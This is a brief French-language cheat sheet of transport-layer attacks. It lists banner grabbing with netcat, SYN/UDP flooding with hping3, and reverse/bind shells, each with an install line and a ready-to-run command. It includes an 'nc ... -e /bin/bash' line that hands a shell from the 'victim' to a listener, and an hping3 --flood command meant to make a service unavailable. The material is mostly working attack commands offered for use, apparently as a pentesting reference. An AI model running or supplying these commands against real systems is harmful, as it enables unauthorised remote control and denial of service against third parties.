# Couche 4 – Transport

## 1. Types d'attaques
- Banner Grabbing  : Récupérer les bannières de services pour identifier leurs versions.
- DoS/SYN Flood/UDP Flood  : Saturer un port ou un service pour le rendre indisponible.
- Reverse Shell / Bind Shell  : Prendre la main sur un système distant via une connexion réseau.

## 2. Outils et méthodes

### ⚡ Attaque : Banner Grabbing

#### Outil : Netcat
**Description** : Permet de se connecter à n’importe quel port pour récupérer la bannière.
**Installation** : sudo apt install netcat
**Commande** : nc [IP cible|192.168.1.1] [port|80]

---

### ⚡ Attaque : DoS/SYN Flood/UDP Flood

#### Outil : Hping3
**Description** : Génère des floods TCP/UDP.
**Installation** : sudo apt install hping3
**Commande** : sudo hping3 -S --flood -p [port|80] [IP cible|192.168.1.1]

---

### ⚡ Attaque : Reverse Shell / Bind Shell

#### Outil : Netcat
**Description** : Permet de créer des shells à distance très facilement.
**Installation** : sudo apt install netcat
**Commande** : nc -lvp [port|4444]
**Commande** : nc [IP cible|192.168.1.1] [port|4444] -e /bin/bash
**Info** : Une commande côté écouteur (serveur), l’autre côté client (victime).
